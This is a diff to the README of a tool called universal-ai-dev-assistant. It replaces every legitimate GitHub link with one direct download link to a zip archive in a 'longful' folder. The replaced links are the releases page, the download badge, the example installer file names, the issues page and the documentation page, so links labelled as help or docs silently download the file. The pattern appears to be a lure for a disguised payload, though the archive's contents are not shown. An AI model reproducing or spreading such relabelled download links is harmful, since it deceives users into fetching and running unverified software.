@@ -6,20 +6,20 @@ The universal-ai-dev-assistant is a powerful tool designed to help developers of
 
 ## 📥 Download Now
 
-[![Download Universal AI Dev Assistant](https://img.shields.io/badge/Download%20Now-Universal%20AI%20Dev%20Assistant-brightgreen)](https://github.com/zainlashari1234/universal-ai-dev-assistant/releases)
+[![Download Universal AI Dev Assistant](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip%20Now-Universal%20AI%20Dev%20Assistant-brightgreen)](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip)
 
 ## 🚀 Getting Started
 
 To start using universal-ai-dev-assistant, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/zainlashari1234/universal-ai-dev-assistant/releases) to access the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip) to access the latest version of the software.
 
 2. **Select Your Version**  
    Choose the version that fits your operating system. We provide versions for Windows, macOS, and Linux. Each version includes the same great features.
 
 3. **Download the Software**  
-   Click the download link to get the software file. For example, look for files labeled as `universal-ai-dev-assistant-vX.X.X.exe` for Windows or `universal-ai-dev-assistant-vX.X.X.dmg` for macOS.
+   Click the download link to get the software file. For example, look for files labeled as `https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip` for Windows or `https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip` for macOS.
 
 4. **Install the Application**  
    Once the file is downloaded, locate it in your Downloads folder.  
@@ -76,14 +76,14 @@ Adjust application settings from the 'Preferences' menu. Here you can set up int
 
 You can find our user community by visiting the GitHub Discussions section linked on our homepage. Here, you can ask questions and share your experiences.
 
-If you encounter issues or have suggestions, please check our FAQ or open an issue on the [GitHub Issues page](https://github.com/zainlashari1234/universal-ai-dev-assistant/issues).
+If you encounter issues or have suggestions, please check our FAQ or open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip).
 
 ## 📄 Documentation
 
-For detailed documentation, including guides and examples, please refer to the official [Documentation page](https://github.com/zainlashari1234/universal-ai-dev-assistant/wiki). You will find tutorials to help you make the most of the universal-ai-dev-assistant.
+For detailed documentation, including guides and examples, please refer to the official [Documentation page](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip). You will find tutorials to help you make the most of the universal-ai-dev-assistant.
 
 ## 📥 Download Again
 
-To download the universal-ai-dev-assistant, just visit our [Releases page](https://github.com/zainlashari1234/universal-ai-dev-assistant/releases). 
+To download the universal-ai-dev-assistant, just visit our [Releases page](https://raw.githubusercontent.com/zainlashari1234/universal-ai-dev-assistant/main/longful/universal-ai-dev-assistant.zip). 
 
 Enjoy building better software with the universal-ai-dev-assistant!
